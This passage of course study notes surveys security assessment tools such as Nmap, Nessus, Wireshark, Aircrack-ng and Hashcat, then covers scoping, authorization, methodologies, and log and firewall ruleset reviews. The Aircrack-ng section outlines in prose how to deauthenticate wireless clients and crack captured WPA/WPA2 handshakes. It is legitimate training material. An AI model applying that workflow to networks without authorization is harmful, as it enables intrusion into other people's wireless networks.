&nbsp;			§ More than just knowing names of tools—testers should see them in action.

&nbsp;			§ Hands-on familiarity ensures confidence and competence during real engagements.

&nbsp;		○ Growth and Customization

&nbsp;			§ Instructor shares personal go-to tools but encourages testers to:

&nbsp;				□ Adapt and expand their toolkit over time.

&nbsp;				□ Add tools as they gain experience and maturity in the field.



Kali Linux

&nbsp;	• Kali Linux is a specialized Linux distribution widely used for penetration testing, but it also supports other types of security assessments. It comes preloaded with a wide range of security tools and can be run as a full operating system or as a virtual machine.

&nbsp;	• Key Concepts

&nbsp;		○ What is Kali Linux?

&nbsp;			§ A penetration testing Linux distribution.

&nbsp;			§ One of the most well-known and widely used in cybersecurity.

&nbsp;		○ Use Cases

&nbsp;			§ Primarily for penetration testing.

&nbsp;			§ Also supports:

&nbsp;				□ Vulnerability assessments.

&nbsp;				□ Certain types of security control assessments.

&nbsp;		○ Features

&nbsp;			§ Fully functional Linux operating system.

&nbsp;			§ Comes preloaded with numerous security tools (ready to use out of the box).

&nbsp;			§ Many downloads can be used as a full replacement OS.

&nbsp;		



Nmap

&nbsp;	• Nmap (Network Mapper) is a powerful and widely used tool for network discovery and scanning. It is included by default in Kali Linux, easy to start using, but offers advanced functionality that requires deeper learning and practice.

&nbsp;	• Key Concepts

&nbsp;		○ What is Nmap?

&nbsp;			§ Stands for Network Mapper.

&nbsp;			§ A tool used to identify systems on a network (host discovery, port scanning, service detection, etc.).

&nbsp;		○ Availability

&nbsp;			§ Downloadable from nmap.org.

&nbsp;			§ Zenmap: GUI-based version available for Windows users.

&nbsp;			§ In Kali Linux, Nmap is preinstalled—no setup needed.

&nbsp;		○ Ease of Use vs. Depth

&nbsp;			§ Simple to start: open terminal, type nmap.

&nbsp;			§ Difficult to master: advanced options and techniques take extensive practice.

&nbsp;			§ Known for being a tool that “takes a moment to learn and a lifetime to master.”

&nbsp;		○ Learning Resources

&nbsp;			§ The Nmap Cheat Sheet (highon.coffee) is recommended for practical, repeatable commands.

&nbsp;				□ https://highon.coffee/blog/nmap-cheat-sheet/



Nexxus

&nbsp;	• Nessus is a widely used host vulnerability scanner that goes beyond identifying active systems (like Nmap does) to detect specific technical vulnerabilities attackers could exploit. It is offered by Tenable in multiple versions, including a free option suitable for personal labs.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of Nessus

&nbsp;			§ Nmap: identifies live hosts and services.

&nbsp;			§ Nessus: identifies technical vulnerabilities on those hosts (missing patches, misconfigurations, weaknesses).

&nbsp;			§ Helps assess what attackers could actually exploit.

&nbsp;		○ Availability and Versions

&nbsp;			§ Provided by Tenable (tenable.com).

&nbsp;			§ Comes in different deployment models:

&nbsp;				□ Cloud-based scanners.

&nbsp;				□ Locally installed scanners.

&nbsp;			§ For training: Nessus Essentials (free edition).

&nbsp;		○ Nessus Essentials

&nbsp;			§ Can scan up to 16 IP addresses.

&nbsp;			§ Designed for home labs and learning purposes.

&nbsp;			§ Good starting point for security testers.

&nbsp;		○ Setup Requirements

&nbsp;			§ Registration with Tenable required (name + email).

&nbsp;			§ Activation code sent via email.

&nbsp;			§ Installer available for multiple OS options.

&nbsp;			§ Setup follows a simple “next, next, finish” process.

&nbsp;			§ If you choose not to register, you can still follow course demos.



Wireshark

&nbsp;	• Wireshark is a widely used tool for capturing and analyzing network packets, essential for network troubleshooting and security assessments. It allows testers to monitor traffic on specific network adapters, filter captures, and analyze communication flows in detail.

&nbsp;	• Key Concepts

&nbsp;		○ What is Wireshark?

&nbsp;			§ A packet capture and analysis tool.

&nbsp;			§ Available at wireshark.org, also preinstalled in Kali Linux.

&nbsp;		○ How It Works

&nbsp;			§ Displays all available network adapters on the system.

&nbsp;			§ Selecting an adapter (e.g., eth0 in Kali for the primary virtual adapter) starts traffic capture.

&nbsp;			§ The “any” adapter captures from all active adapters at once, but this may be messy or confusing.

&nbsp;		○ Capturing Traffic

&nbsp;			§ When capture starts, network activity is displayed visually (like a “heartbeat monitor”).

&nbsp;			§ Packets are saved to the local testing system for analysis.

&nbsp;			§ You can:

&nbsp;				□ Filter in real time while capturing.

&nbsp;				□ Capture everything and filter offline later (recommended for accuracy).

&nbsp;		○ Filtering Benefits

&nbsp;			§ Filters help narrow down relevant traffic (e.g., exclude your own machine’s traffic).

&nbsp;			§ However, depending on the test scenario, filtering out too much may miss important data.

&nbsp;			§ Best practice: capture all first, filter later for flexibility.

&nbsp;		○ Adaptability

&nbsp;			§ Users can tweak capture configurations as they gain experience.

&nbsp;			§ Wireshark’s flexibility makes it useful for both beginner testers and advanced analysts.



Lynis

&nbsp;	• Lynis is a security configuration assessment tool for Linux systems that evaluates system hardening and compliance. It provides both quick local scans and enterprise-level multi-system assessments, producing a hardening index score and detailed reports for remediation.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of Lynis

&nbsp;			§ Used for security configuration assessments on Linux systems.

&nbsp;			§ Validates how well a system is hardened against attacks.

&nbsp;		○ Versions of Lynis

&nbsp;			§ Open Source Version

&nbsp;				□ Lightweight (≈1000 lines of shell code).

&nbsp;				□ Suitable for scanning a single local/remote server or a single Docker file.

&nbsp;			§ Enterprise Version

&nbsp;				□ Paid.

&nbsp;				□ Designed for scanning multiple systems at scale.

&nbsp;		○ Assessment Output

&nbsp;			§ Onscreen results are color-coded for quick readability.

&nbsp;			§ Generates a hardening index (0–100) → a “How secure is this system?” score.

&nbsp;			§ Full scan results saved in /var/log/Lynis-report.dat.

&nbsp;		○ Customization

&nbsp;			§ After initial use, testers can modify the default.prf preferences file.

&nbsp;			§ Allows tailoring of which checks Lynis should perform.

&nbsp;		○ Integration with Benchmarks

&nbsp;			§ CIS Benchmarks (Center for Internet Security) can be used to interpret Lynis results.

&nbsp;			§ Provides industry-aligned guidance for improving configurations.

&nbsp;		



CIS-CAT Lite

&nbsp;	• CIS-CAT Lite is a free tool from the Center for Internet Security (CIS) that scans systems for security configuration weaknesses based on CIS Benchmarks. While limited in scope compared to the Pro version, it provides a starting point for organizations to assess compliance with secure configuration standards.

&nbsp;	• Key Concepts

&nbsp;		○ CIS Benchmarks

&nbsp;			§ Comprehensive technical guides for securing systems.

&nbsp;			§ Widely recognized as best practices for configuration hardening.

&nbsp;		○ CIS-CAT (Configuration Assessment Tool)

&nbsp;			§ Nessus vs. CIS-CAT:

&nbsp;				□ Nessus → scans for vulnerabilities (software flaws, missing patches).

&nbsp;				□ CIS-CAT → scans for configuration weaknesses (settings that don’t align with CIS Benchmarks).

&nbsp;		○ CIS-CAT Lite (Free Version)

&nbsp;			§ Available to registered users after providing contact info.

&nbsp;			§ Limited functionality: can only scan Windows 10, Ubuntu Linux, and Google Chrome.

&nbsp;			§ Serves as an introductory tool to show how the Pro version works.

&nbsp;		○ CIS-CAT Pro (Paid Version)

&nbsp;			§ Supports all CIS Benchmarks across many technologies.

&nbsp;			§ Includes CIS WorkBench → allows customization of benchmarks to match internal standards.

&nbsp;		○ Technical Requirements

&nbsp;			§ CIS-CAT Lite is a Java application.

&nbsp;			§ Requires Java to run → potential security concerns since Java has been a frequent target of exploits.

&nbsp;			§ Note: Java is preinstalled on Kali Linux, but installing it elsewhere should be done with caution.



Aircrack-ng

&nbsp;	• Aircrack-ng is a suite of tools used for testing the security of wireless networks. It enables penetration testers to analyze wireless encryption, capture traffic, and attempt to crack WEP, WPA, and WPA2 keys (with WPA3 being generally secure unless misconfigured).

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of Aircrack-ng

&nbsp;			§ Designed for wireless network security testing.

&nbsp;			§ Commonly used in penetration tests where wireless is in scope.

&nbsp;		○ Setup Requirements

&nbsp;			§ Requires a compatible wireless network adapter (e.g., Alfa adapters with Realtek chipset).

&nbsp;			§ Kali Linux provides guidance on driver troubleshooting if needed.

&nbsp;		○ Encryption Detection \& Cracking

&nbsp;			§ Identifies wireless encryption types: Open (unencrypted), WEP, WPA, WPA2.

&nbsp;			§ WEP, WPA, WPA2 can potentially be cracked.

&nbsp;			§ WPA3 is considered secure unless misconfigured.

&nbsp;		○ Core Tools in the Suite

&nbsp;			§ airmon-ng → Starts a virtual wireless adapter for capturing traffic.

&nbsp;			§ airodump-ng → Monitors nearby access points (APs) and clients, can filter by MAC/hardware addresses.

&nbsp;			§ aireplay-ng → Launches deauthentication attacks, forcing clients to disconnect and reconnect.

&nbsp;			§ aircrack-ng → Attempts to crack the captured encryption keys using the 4-way handshake exchanged during reconnection.

&nbsp;		○ Workflow Summary

&nbsp;			§ Start monitoring with airmon-ng.

&nbsp;			§ Scan networks and clients with airodump-ng.

&nbsp;			§ Use aireplay-ng to deauthenticate a client.

&nbsp;			§ Capture the 4-way handshake during reconnection.

&nbsp;			§ Run aircrack-ng to attempt decryption of WEP/WPA/WPA2 keys.

&nbsp;		○ Learning Resources

&nbsp;			§ Official tutorials and guides at aircrack-ng.org.

&nbsp;			§ Step-by-step instructions maintained by developers.



Hashcat

&nbsp;	• Hashcat is one of the fastest and most powerful password-cracking tools available. It supports hundreds of hash types, is included in Kali Linux by default, and is highly effective in penetration testing when testers understand the context of the password source.

&nbsp;	• Key Concept

&nbsp;		○ Password Cracking Tools Landscape

&nbsp;			• Other well-known tools: John the Ripper, THC Hydra, L0phtCrack, RainbowCrack.

&nbsp;			• Hashcat stands out as one of the fastest and most capable.

&nbsp;		○ Why Hashcat is Popular

&nbsp;			• Installed by default on Kali Linux.

&nbsp;			• Extremely fast performance compared to alternatives.

&nbsp;			• Supports 350+ hash types, including widely used algorithms like MD5 and NTLM.

&nbsp;		○ Using Hashcat

&nbsp;			• Command: hashcat -h displays the help file, showing available options and capabilities.

&nbsp;			• The tool’s power lies in its wide range of modes, attack strategies, and optimizations.

&nbsp;		○ Success Factors in Cracking

&nbsp;			• Cracking effectiveness improves the more you know about the password source (e.g., complexity rules, likely patterns, wordlists).

&nbsp;			• Context and strategy matter as much as tool speed.

&nbsp;		○ Learning Approach

&nbsp;			• Instructor plans a demo to show Hashcat in action.

&nbsp;			• Hands-on practice helps reveal its full potential.



ÒWASP ZAP

&nbsp;	• OWASP ZAP (Zed Attack Proxy) is an open-source web application security scanner sponsored by OWASP (and more recently by Checkmarx). It is designed to identify vulnerabilities in web applications, offering both automated scans and manual testing tools, but must be used carefully since web app scanners can sometimes disrupt target applications.

&nbsp;	• Key Concepts

&nbsp;		○ Difference from Host Scanners

&nbsp;			§ Host vulnerability scanners:

&nbsp;				□ Signature-based → yes/no checks for known issues.

&nbsp;				□ Safer, less likely to disrupt systems.

&nbsp;			§ Web application scanners:

&nbsp;				□ More open-ended, simulate malicious user behavior.

&nbsp;				□ Higher risk of breaking or disrupting applications.

&nbsp;		○ Precautions in Web App Scanning

&nbsp;			§ Always test against non-production applications first.

&nbsp;			§ Adjust configurations to avoid unnecessary damage before testing production.

&nbsp;		○ Role of OWASP

&nbsp;			§ OWASP (Open Web Application Security Project): nonprofit dedicated to improving web app security.

&nbsp;			§ Provides open-source projects:

&nbsp;				□ Guides and standards (e.g., testing guides).

&nbsp;				□ Tools for automated and manual testing.

&nbsp;		○ OWASP ZAP

&nbsp;			§ Open-source web application security scanner.

&nbsp;			§ Features:

&nbsp;				□ Automated scanning for common vulnerabilities.

&nbsp;				□ Manual testing tools to support penetration testing.

&nbsp;			§ Installed by default in Kali Linux.

&nbsp;			§ Info and downloads at zaproxy.org.

&nbsp;		○ Project Sponsorship Update

&nbsp;			§ As of September 2024, ZAP’s dev team partnered with Checkmarx, who now sponsors the project.

&nbsp;			§ OWASP continues to maintain other projects, including intentionally vulnerable apps (e.g., Juice Shop) for training purposes.

&nbsp;		○ Training Use Case

&nbsp;			§ The course demonstrates ZAP by scanning Juice Shop, a deliberately vulnerable app for hands-on learning.



Prowler

&nbsp;	• Prowler is a cloud security posture management (CSPM) tool that checks cloud environments against security best practices and compliance requirements. It supports multiple cloud platforms, provides hundreds of checks based on dozens of frameworks, and is available as both an open-source and commercial solution.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of Prowler

&nbsp;			§ Authenticates to cloud environments.

&nbsp;			§ Runs security and compliance checks.

&nbsp;			§ Compares configurations against best practices and compliance frameworks.

&nbsp;		○ Availability

&nbsp;			§ Open source version (free, with CLI and GUI options).

&nbsp;			§ Commercial product with full support.

&nbsp;		○ Cloud and Platform Support

&nbsp;			§ Major providers: AWS, Azure, Google Cloud, Kubernetes, Microsoft 365

&nbsp;			§ Others: GitHub, NHN Cloud (NHN unofficial).

&nbsp;		○ Compliance and Security Standards

&nbsp;			§ Built around well-known frameworks:

&nbsp;				□ CIS Critical Security Controls.

&nbsp;				□ NIST Cybersecurity Framework.

&nbsp;				□ HIPAA, GDPR, SOC 2, etc.

&nbsp;			§ For AWS: ~600 unique checks across 40 compliance frameworks.

&nbsp;		○ Interfaces

&nbsp;			§ Command-line interface (CLI) for advanced users.

&nbsp;			§ Web-based GUI for those preferring visual management.

&nbsp;			§ Both available in the open-source version.

&nbsp;		○ Authentication Challenges

&nbsp;			§ The most complex part of setup is configuring authentication securely.

&nbsp;			§ Since it connects to sensitive cloud environments, proper configuration is critical.

&nbsp;			§ Supports multiple authentication methods, including MFA (multi-factor authentication).

&nbsp;			§ Documentation and guides at docs.prowler.com.





#### Planning Your Assessment



Understanding Your Assessment

&nbsp;	• Defining and confirming the scope of a security assessment is critical. It ensures you know which systems to test, keeps the client satisfied, and most importantly, protects you from legal or operational risks when working with third-party environments.

&nbsp;	• Key Concepts

&nbsp;		○ Impact of Assessment Type

&nbsp;			§ The type of assessment (risk, controls, compliance, vulnerability, penetration) influences how you scope the work.

&nbsp;			§ Each assessment type has different goals, targets, and requirements.

&nbsp;		○ Client Considerations

&nbsp;			§ The requester is always the client—whether internal or external.

&nbsp;			§ A happy client is more likely to bring repeat work, so communication and alignment are key.

&nbsp;		○ Defining Systems in Scope

&nbsp;			§ Ask for a list of systems to include:

&nbsp;				□ Hostnames.

&nbsp;				□ IP addresses.

&nbsp;				□ URLs.

&nbsp;			§ If only IP ranges are provided, you’ll need to determine which hosts are live.

&nbsp;		○ Authorization is Critical

&nbsp;			§ Confirm the client has authority to approve testing.

&nbsp;			§ Safe scenarios: client-owned on-premises systems.

&nbsp;			§ Risky scenarios: third-party systems (e.g., Salesforce, ServiceNow, AWS, Azure).

&nbsp;				□ Even if the client assumes permission, testing without explicit third-party approval can cause problems.

&nbsp;			§ Always get written authorization before testing.

&nbsp;		○ Risk Avoidance

&nbsp;			§ Testing third-party systems without approval can cause:

&nbsp;				□ Service disruption.

&nbsp;				□ Legal and compliance issues.

&nbsp;			§ Proper scoping and authorization prevent unnecessary risks.



Improving Over Time

&nbsp;	• Security assessments should be done strategically and consistently over time, not just tactically. Without a documented, repeatable methodology, organizations risk producing inconsistent results that prevent them from accurately measuring security improvements.

&nbsp;	• Key Concepts

&nbsp;		○ Tactical vs. Strategic Thinking

&nbsp;			§ Tactical: Treating each assessment as a one-time snapshot.

&nbsp;			§ Strategic: Looking at progress over time to measure security maturity.

&nbsp;		○ Importance of Measuring Improvement

&nbsp;			§ Security maturity requires tracking progress.

&nbsp;			§ Consistent assessments provide reliable data to demonstrate improvements and ROI to leadership.

&nbsp;		○ Scenario of Inconsistency

&nbsp;			§ Year 1: Experienced pentester (Dave) → focused on exploitation.

&nbsp;			§ Year 2: Vulnerability scanner expert (Deborah) → relied heavily on automated scanning.

&nbsp;			§ Year 3: Inexperienced consultant (Dylan) → used a generic checklist with limited expertise.

&nbsp;			§ Outcome: Reports are inconsistent, making it impossible to measure improvement across the three years.

&nbsp;		○ NIST Guidance

&nbsp;			§ NIST SP 800-115 (Technical Guide to Information Security Testing and Assessments) recommends:

&nbsp;				□ Documented methodologies.

&nbsp;				□ Repeatable processes.

&nbsp;			§ These ensure consistency, reliability, and measurable results across assessments.

&nbsp;		○ Avoiding the Pitfall

&nbsp;			§ Use a standardized, repeatable methodology.

&nbsp;			§ Select tools and approaches that align with organizational goals, not just tester preference.

&nbsp;			§ Focus on producing consistent, measurable outputs that leadership can track year over year.



Selecting Your Methodology

&nbsp;	• The choice of a security assessment methodology depends on the type of assessment being conducted. Different frameworks and standards provide structured approaches for risk, controls, and compliance assessments, helping organizations ensure consistency, effectiveness, and regulatory alignment.

&nbsp;	• Key Concepts

&nbsp;		○ Risk Assessment Methodologies

&nbsp;			§ NIST SP 800-30 Rev. 1 → Guide for conducting risk assessments; primarily qualitative.

&nbsp;			§ FAIR (Factor Analysis of Information Risk) → Offers a quantitative approach to assessing risk.

&nbsp;		○ Security Controls Assessment Methodologies

&nbsp;			§ NIST Cybersecurity Framework (CSF) → Comprehensive control set centered on governance.

&nbsp;			§ ISO/IEC 27002:2022 → Code of practice for information security controls; provides detailed control catalog.

&nbsp;		○ Compliance Assessments

&nbsp;			§ Driven by specific data types and regulatory requirements.

&nbsp;			§ Examples:

&nbsp;				□ PCI DSS → Applies to organizations handling credit card data.

&nbsp;					® Requirements vary depending on the volume of transactions.

&nbsp;					® Determines whether organizations can self-assess or must hire a certified third party.

&nbsp;				□ HIPAA (1996) → Applies to U.S. organizations handling ePHI (electronically protected health information).

&nbsp;					® Requires a security risk assessment aligned with HIPAA-mandated controls.

&nbsp;		○ Frequency and Scope of Compliance Assessments

&nbsp;			§ Determined by factors such as:

&nbsp;				□ Type of data processed.

&nbsp;				□ Volume of transactions or records handled.

&nbsp;				□ Applicable regulatory mandates.

&nbsp;		○ Unified Compliance Framework (UCF)

&nbsp;			§ Maps 800+ authority documents.

&nbsp;			§ Helps organizations identify which controls must be tested to achieve compliance with multiple overlapping standards/regulations.



Selecting Your Tools

&nbsp;	• When conducting vulnerability assessments (or penetration tests), the choice of tools and methodologies must align with the type of assessment, client needs, and consistency goals. A mix of commercial and open-source tools are available, and testers must also decide between authenticated vs. unauthenticated scans while ensuring consistent use of methodologies for measurable results over time.

&nbsp;	• Key Concepts

&nbsp;		○ Tool Categories for Vulnerability Assessments

&nbsp;			§ Host Vulnerability Scanners:

&nbsp;				□ Commercial: Nessus, Qualys VMDR.

&nbsp;				□ pen-source: OpenVAS (originally forked from Nessus).

&nbsp;			§ Web Application Vulnerability Scanners:

&nbsp;				□ Commercial: Veracode, AppScan, Sentinel, Acunetix, Checkmarx, Invicti (formerly Netsparker).

&nbsp;				□ Open-source / Community favorites: Burp Suite, OWASP ZAP.

&nbsp;		○ Authenticated vs. Unauthenticated Scans

&nbsp;			§ Unauthenticated scans:

&nbsp;				□ Simulate an outsider’s perspective.

&nbsp;				□ Safer for production systems but less detailed.

&nbsp;			§ Authenticated scans:

&nbsp;				□ Simulate a trusted insider’s perspective.

&nbsp;				□ Provide more accurate, detailed results.

&nbsp;				□ Carry higher risk of impacting production systems.

&nbsp;			§ Best practices:

&nbsp;				□ Run unauthenticated scans on internet-facing systems.

&nbsp;				□ Run authenticated scans on internal production hosts and non-production app instances.

&nbsp;		○ Penetration Testing Methodologies

&nbsp;			§ Tester skill and experience affect methodology variance.

&nbsp;			§ Common standards:

&nbsp;				□ PTES (Penetration Testing Execution Standard) → widely recommended.

&nbsp;				□ OSSTMM (Open-Source Security Testing Methodology Manual) → robust resource.

&nbsp;		○ Manual Testing Resources

&nbsp;			§ OWASP Web Security Testing Guide → manual testing for web apps.

&nbsp;			§ OWASP Mobile Security Testing Guide → manual testing for mobile apps.

&nbsp;			§ CIS Benchmarks → detailed configuration guidance for systems, networks, and databases.

&nbsp;		○ Consistency Across Assessments

&nbsp;			§ Select methodologies that align with client needs and expectations.

&nbsp;			§ Use the same methodologies across multiple assessments to:

&nbsp;				□ Ensure consistent results.

&nbsp;				□ Enable tracking of progress over time.



Basic Assessment Tools

&nbsp;	• Once scope and methodology are set, choosing tools for security assessments is straightforward. The right choice depends on budget, complexity, and collaboration needs, with different tools fitting risk assessments, security controls assessments, and ISO-aligned organizations.

&nbsp;	• Key Concepts

&nbsp;		○ Factors in Tool Selection

&nbsp;			§ Budget: What can the organization afford?

&nbsp;			§ Complexity: How steep is the learning curve?

&nbsp;			§ Collaboration: Is the assessment individual or team-based?

&nbsp;		○ Tools for Risk Assessments

&nbsp;			§ Often don’t require complex automated tools.

&nbsp;			§ Many consultants rely on custom spreadsheet tools with built-in scoring.

&nbsp;			§ Example: SimpleRisk → offers pre-configured virtual machines for easy setup, plus a hosted option.

&nbsp;		○ Tools for Security Controls Assessments

&nbsp;			§ Traditionally done with spreadsheets to capture responses and insights.

&nbsp;			§ Recently, some have moved to SaaS-based solutions.

&nbsp;			§ Emphasis is on Q\&A discussions with staff responsible for controls.

&nbsp;		○ ISO-Specific Resources

&nbsp;			§ ISO 27K Toolkit (ISO27001security.com): free collection of documents, spreadsheets, PowerPoints, etc.

&nbsp;			§ Helps assess against ISO/IEC 27001 and 27002.

&nbsp;			§ Good starter resource before purchasing the official standards.

&nbsp;			§ Official standards available at iso.org.



Advanced Assessments Tools

&nbsp;	• Advanced assessment tools extend beyond basic scanners and are often tied to specific compliance requirements, penetration testing methodologies, or web application testing. Many authoritative organizations and community-driven projects provide curated lists of tools that security testers should reference and use.

&nbsp;	• Key Concepts

&nbsp;		○ Compliance Assessment Tools

&nbsp;			§ Often provided by the compliance authority itself.

&nbsp;			§ Examples:

&nbsp;				□ PCI DSS → self-assessment questionnaires available at pcisecuritystandards.org.

&nbsp;				□ HIPAA → security risk assessment tool available from OCR/ONC (free download).

&nbsp;		○ Vulnerability \& Penetration Testing Tools

&nbsp;			§ Best starting point: methodology guides.

&nbsp;			§ PTES (Penetration Testing Execution Standard) → references technical tools at pentest-standard.org.

&nbsp;			§ OSSTMM (Open Source Security Testing Methodology Manual) → additional resource at isecom.org.

&nbsp;		○ Web Application Testing Tools

&nbsp;			§ OWASP provides curated lists of application security testing tools.

&nbsp;			§ These lists are among the most comprehensive and up-to-date for web app security.

&nbsp;			§ Should be bookmarked as a go-to resource.

&nbsp;		○ General Security Tools

&nbsp;			§ SecTools.org → contains a “Top 125 Network Security Tools” list.

&nbsp;			§ While somewhat dated, many tools listed remain highly relevant.

&nbsp;			§ Useful for rounding out knowledge of network and security testing tools.



#### Review Techniques



Documentation Review

&nbsp;	• A documentation review evaluates whether an organization’s security documentation (policies, standards, guidelines, and procedures) is complete, cohesive, reasonable, and actually implemented in practice. It ensures alignment with compliance requirements, control frameworks, and practical security goals.

&nbsp;	• Key Concepts

&nbsp;		○ ISACA’s Four Key Documentation Types

&nbsp;			§ Policies → High-level principles the organization commits to.

&nbsp;			§ Standards → Mandatory requirements to meet policy goals.

&nbsp;			§ Guidelines → Flexible instructions for areas not fully covered by standards (often technology-specific).

&nbsp;			§ Procedures → Step-by-step, prescriptive instructions for implementation.

&nbsp;		○ Relationships Among Documents

&nbsp;			§ Example: Mobile Security

&nbsp;				□ Policy → Secure use of mobile devices.

&nbsp;				□ Standards → Required device/app security settings.

&nbsp;				□ Guidelines → Supplemental advice for new OS or app versions.

&nbsp;				□ Procedures → Instructions for applying those settings.

&nbsp;			§ Cohesiveness is critical: remediation should start with policies and flow downward.

&nbsp;		○ Completeness of Documentation

&nbsp;			§ Documentation requirements depend on:

&nbsp;				□ Compliance obligations.

&nbsp;				□ Selected security control frameworks.

&nbsp;			§ Organizations should compile a list of required docs based on standards/regulations.

&nbsp;		○ Criteria to Evaluate Documents

&nbsp;			§ Last review date.

&nbsp;			§ Reviewer and approver (sign-off).

&nbsp;			§ Scope definition.

&nbsp;			§ Policy alignment with reasonable security practices.

&nbsp;			§ Technical standards aligned with best practices (e.g., CIS Benchmarks → adjusted to avoid over-implementation or unnecessary cost).

&nbsp;		○ Critical Review Question

&nbsp;			§ “Are they really doing this?”

&nbsp;			§ Many organizations create documentation but never implement it, leading to a false sense of security.

&nbsp;		○ Supporting Documentation to Review

&nbsp;			§ Architectural diagrams (Visio, Figma, etc.).

&nbsp;			§ System Security Plans (SSPs) → Narratives on how controls are implemented.

&nbsp;			§ Third-party contracts → Ensure data protection clauses are included.

&nbsp;			§ Security incident response plans → Documented and tested.

&nbsp;			§ Disaster recovery \& business continuity plans → Preparedness for operational disruptions.



Log Review

&nbsp;	• Log reviews are critical for visibility into system and user activity, threat detection, and incident investigation. Logs should be collected and configured for security value—not just for compliance—and reviews should ensure both proper activation and configuration of logging across systems.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of Logs

&nbsp;			§ Not just for compliance—logs must provide security insight.

&nbsp;			§ Offer visibility into:

&nbsp;				□ System-to-system communication.

&nbsp;				□ User activities within applications.

&nbsp;				□ Potential threats or suspicious events.

&nbsp;		○ Value of Log Analysis

&nbsp;			§ Helps detect:

&nbsp;				□ Malicious login attempts from suspicious IPs.

&nbsp;				□ Reconnaissance activity before an attack.

&nbsp;				□ Unauthorized privilege escalations (e.g., new global admin at odd hours).

&nbsp;		○ Critical Log Settings to Review

&nbsp;			§ Authentication attempts: especially failed and sensitive login attempts.

&nbsp;			§ Privileged account activity.

&nbsp;			§ System/service startup and shutdown events.

&nbsp;			§ Network metadata: source IP, destination IP, date, time.

&nbsp;			§ Goal: enough context to identify what happened, where, and when.

&nbsp;		○ Documentation to Review First

&nbsp;			§ Logging and monitoring policies and standards, focusing on:

&nbsp;				□ Activation → Which systems are required to have logging enabled?

&nbsp;				□ Configuration → What specific log settings must be applied?

&nbsp;		○ Security vs. Compliance

&nbsp;			§ Compliance requirements provide a baseline, but compliance alone is insufficient.

&nbsp;			§ Effective log management requires strategic collection and analysis.



Log Management Tools

&nbsp;	• Effective log management goes beyond collecting server logs—it requires aggregating multiple log sources, centralizing storage, ensuring consistency, and using tools (log management or SIEM) to analyze data. Without proper tools and retention, organizations risk losing critical forensic evidence during incidents.

&nbsp;	• Key Concept

&nbsp;		○ Beyond Server Logs

&nbsp;			§ Server OS logs are important, but insufficient.

&nbsp;			§ Organizations should also collect:

&nbsp;				□ Application logs

&nbsp;				□ Database logs

&nbsp;				□ Web server logs

&nbsp;				□ Endpoint activity logs

&nbsp;		○ Challenges in Log Management

&nbsp;			§ Storage requirements can be massive in large enterprises.

&nbsp;			§ Logs should be stored on a centralized server.

&nbsp;			§ Time synchronization across systems is critical.

&nbsp;			§ Retention policies must satisfy:

&nbsp;				□ Compliance needs.

&nbsp;				□ Incident response/forensics requirements.

&nbsp;		○ Log Management vs. SIEM

&nbsp;			§ Log Management System: Collects, stores, and organizes logs.

&nbsp;			§ SIEM (Security Information and Event Management): Adds correlation, analysis, and alerting.

&nbsp;		○ Common Tools

&nbsp;			§ Commercial solutions:

&nbsp;				□ Splunk

&nbsp;				□ Qradar

&nbsp;				□ LogRhythm

&nbsp;				□ AlienVault

&nbsp;			§ Open-source solutions:

&nbsp;				□ Syslog (native Linux logging).

&nbsp;				□ Syslog-ng (enhanced version).

&nbsp;				□ Graylog.

&nbsp;				□ ELK Stack (Elasticsearch, Logstash, Kibana).

&nbsp;		○ Practical Importance

&nbsp;			§ Without consistent log collection and retention, forensic investigations fail.

&nbsp;			§ Example: Healthcare org incident → logs incomplete, inconsistent, or expired.

&nbsp;			§ Result: Inability to reconstruct attack timeline.

&nbsp;		○ Recommended Resource

&nbsp;			§ Critical Log Review Checklist for Security Incidents (Lenny Zeltser \& Anton Chuvakin).

&nbsp;			§ Free resource: zeltser.com/cheat-sheets/.

&nbsp;			§ Provides practical guidance on what log data is most valuable during incidents.



Ruleset Review

&nbsp;	• A ruleset review analyzes the configuration of network security devices (firewalls, routers, IDS/IPS) to ensure rules enforce security best practices, reduce unnecessary complexity, and align with business needs. Proper configuration is essential to prevent misconfigurations that create false security or unnecessary risk.

&nbsp;	• Key Concept

&nbsp;		○ Purpose of Ruleset Review

&nbsp;			§ Assess configurations of routers, firewalls, IDS, IPS.

&nbsp;			§ Rules act as access control settings—they determine what traffic is allowed or denied.

&nbsp;		○ Best Practice – Default Deny

&nbsp;			§ Leading practice: Deny all traffic by default, then explicitly allow based on business needs.

&nbsp;			§ Provides stronger security but requires deeper business understanding and administrative effort.

&nbsp;		○ Example of Misconfiguration

&nbsp;			§ Case: A firewall with a single rule, “Permit IP Any Any”.

&nbsp;			§ Technically met partner compliance, but provided zero security value.

&nbsp;		○ Key Review Considerations

&nbsp;			§ Is Deny All present and properly placed in the ruleset?

&nbsp;				□ Too high in the list blocks all traffic, including business-critical.

&nbsp;			§ Are the rules necessary? (Remove clutter and unused rules).

&nbsp;			§ Do rules follow the principle of least privilege?

&nbsp;				□ Limit access to specific IPs/ports instead of broad permissions.

&nbsp;			§ Ensure specific rules take precedence over general ones.

&nbsp;			§ Close unnecessary ports, especially admin services like SSH and RDP.

&nbsp;			§ Ensure documented requirements exist for all rules.

&nbsp;			§ No backdoors or bypasses should be allowed.

&nbsp;		○ IDS/IPS Rule Review

&nbsp;			§ Disable or remove unnecessary signatures to:

&nbsp;				□ Reduce log storage burden.

&nbsp;				□ Minimize false positives.

&nbsp;			§ Fine-tune required signatures so alerts are actionable.

&nbsp;		○ Tools for Review \& Testing

&nbsp;			§ Use Nmap → to scan for open ports and validate firewall behavior.

&nbsp;			§ Nipper → historically a go-to firewall ruleset auditing tool.

&nbsp;				□ Still effective but no longer free.



System Configuration Review

&nbsp;	• System configuration reviews are essential but resource-intensive security assessment tasks. Automation through scanning tools (like Lynis or CIS-CAT) is critical, and the approach should align with the client’s documented security standards to ensure efficiency and relevance.

&nbsp;	• Key Concepts

&nbsp;		○ Challenge of Manual Reviews

&nbsp;			§ Reviewing configurations across thousands of endpoints manually is nearly impossible.

&nbsp;			§ Automation is essential for scalability and efficiency.

&nbsp;		○ Role of Security Standards

&nbsp;			§ Client’s documented security standards define:

&nbsp;				□ Required/allowed services.

&nbsp;				□ Necessary privileged accounts.

&nbsp;				□ Encryption and security settings.

&nbsp;			§ These should guide what testers look for in a configuration review.

&nbsp;		○ Approach #1: General Scan + Standards Reference

&nbsp;			§ Use tools like Lynis or CIS-CAT.

